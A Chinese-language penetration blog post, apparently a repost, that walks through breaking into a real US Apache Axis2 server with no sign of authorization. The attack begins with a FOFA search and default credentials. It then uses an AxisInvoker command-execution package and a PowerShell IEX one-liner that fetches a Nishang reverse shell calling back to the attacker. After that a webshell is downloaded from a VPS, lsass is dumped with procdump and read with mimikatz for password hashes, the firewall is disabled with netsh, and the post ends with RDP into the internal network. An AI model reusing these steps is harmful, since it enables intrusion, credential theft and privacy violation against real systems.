FROM

```
https://www.cnblogs.com/backlion/p/15793287.html
```

学到了：

1. 出网可以直接powershell执行CS上线脚本
2. procdump导出lsass.dmp，本地mimikatz抓hash

---

# [绕过杀软拿下目标站](https://www.cnblogs.com/backlion/p/15793287.html)

## 0x01 目标 

```ini
country="US" && app="APACHE-Axis"
```

从老洞捡些漏网之鱼，没准还会有意外收获

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164702590-1914940666.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152230-3fdd024a-e474-1.png)

目标出现

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164703269-409796320.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152405-78cd6edc-e474-1.png)

还是熟悉的页面，熟悉的端口

然后尝试默认口令登录，ok, 这下稳了

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164703784-492837324.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152611-c39b0fd2-e474-1.png)

先搜集一下信息

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164704428-1031611363.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152642-d5faad2c-e474-1.png)

不要上来就部署包，先看一下现有的服务，像这种弱口令的基本上99.9999%都已经被人搞过了

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164704943-1143663517.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152741-f993a5c2-e474-1.png)

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164705503-859439348.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152750-fed326c0-e474-1.png)

再上传包就多此一举了，可以直接利用

找了一圈没发现遗留的马儿

找绝对路径自己上传

```bash
C:/elocker/webapps/admin/WEB-INF/classes
```

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164705932-1966461831.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714153205-96dbfabe-e475-1.png)

顺手一测，竟然可以出网，也不需要传shell了，直接掏出cs

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164706379-551799478.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714153502-00089858-e476-1.png)

执行命令

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164707036-902281158.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714153550-1c8a1ac4-e476-1.png)

看结果失败了

## 0x02 反弹shell

难道是因为在url里执行，导致powershell命令没有执行成功吗？

带着这个疑问 反弹shell尝试一下

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164707518-742169218.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714154439-57dcf456-e477-1.png)

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164707971-2053066810.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714154458-639ac7dc-e477-1.png)

结果还是失败，可以确定，应该是有waf

## 0x03 写入shell

```bash
x.x.x.x:8080/services/config/download?url=http://x.x.x.x/dama.txt&path=C:\elocker\webapps\admin\axis2-web\shell.jsp
```

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164708430-796309663.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714154852-ef1d462c-e477-1.png)

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164708961-1830718985.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714154904-f5c0690a-e477-1.png)

查看一下进程

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164709700-431368973.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714155219-6a1d0d30-e478-1.png)

通过对比发现某安全卫士

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164710274-561240991.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714155312-8990a0d2-e478-1.png)

## 0x04 绕过杀软

通过测试发现，最基本的`net user`也执行不了

摆在面前的路只有2条

- 做免杀
- 抓密码

果断选择抓密码，简单有效。

mimikatz不免杀不可直接用

这里我利用procdump把lsass进程的内存文件导出本地，再在本地利用mimikatz读取密码

上传 procdump64.exe 并下载lsass.dmp

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164710740-364111678.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161612-c024ab04-e47b-1.png)

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164711227-614035489.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161418-7c3254a0-e47b-1.png)

再在本地解析文件

```perl
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# 导出为lsass.dump文件
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
# 把lsass.dmp放在mimikatz目录利用
```

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164711763-157868246.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161629-ca5812c8-e47b-1.png)

得到hash,破解密码

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164712218-2039058059.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161655-d9eec1e6-e47b-1.png)

## 0x05 登录服务器

查看防火墙状态

```sql
Netsh Advfirewall show allprofiles
```

关闭防火墙

```vbnet
NetSh Advfirewall set allprofiles state off
```

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164712683-3724176.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161836-163a269a-e47c-1.png)

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164713102-414798445.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161850-1e4f2a24-e47c-1.png)

内网IP，需搭建代理

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164713537-195359877.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162039-5fb46380-e47c-1.png)

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164713911-848756372.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162053-67e3d18a-e47c-1.png)

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164714273-555776031.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162104-6eb74cf8-e47c-1.png)

## 0x06 登录云桌面，发现意外惊喜

发现机主运行了 telegram，嘿嘿

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164714865-1133025225.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162152-8adbfeb0-e47c-1.png)

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164716092-1085897559.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162204-927a1bf2-e47c-1.png)

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220112164716924-903276189.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162215-98ed53aa-e47c-1.png)

## 0x07 总结

1.通过fofa的语法country="US" && app="APACHE-Axis"进行搜索漏洞目标

2.发现存在一个axis2的后台，该页面存在弱口令（admin/axis2）

3.在后台处的upload sevice处上传AxisInvoker.aar包

4.查询到网站的绝对路径为：C:/elocker/webapps/admin/WEB-INF/classes

http://www.xxx.com/axis2/services/AxisInvoker/info

5.尝试通过cs生成posershell后门程序，通过访问下面地址触发，但是访问失败(可能系统中存在杀软拦截了）

http://www.xxx.com/axis2/services/AxisInvoker/exec?cmd=powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress yourip -port 6666

http://www.xxx.com/axis2/services/AxisInvoker/exec?cmd=dir%20C：

6.通过下载文件方式写入大马

http://www.xxx.com/axis2/services/AxisInvoker/download?url=http://vps/data.txt&file=C:\elocker\webapps\admin\axis2-web\shell.jsp

7.在大马中执行tasklist,发现存在360tary(360杀毒）以及zhudongfangyu.exe（安全卫士）

8.在大马中上传冰蝎的一句户话木马，然后连接，执行命令net user出错。

9.这里通过冰蝎上传 procdump64.exe,并执行命令导出lsass.dmp

 procdump64.exe -accepteula -ma lsass.exe lsass.dmp

10.通过冰蝎下载 lsass.dmp到本地。

11.通过mimkiatz导入lsass.dump并读取出hash值

mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit

12.通过md5破解网站对HSAH值进行NTML破解，并成功破解出密码：123QWEqwe

13.通过大马执行以下命令

Netsh Advfirewall show allprofiles //查看防火墙状态

NetSh Advfirewall set allprofiles state off //关闭防火墙

14.通过冰蝎自带的socke功能开启代理，本地设置Proxifier代理将MSTSC添加到代理中

15.通过代理执行mstsc，远程桌面登录内网，桌面发现存在telegram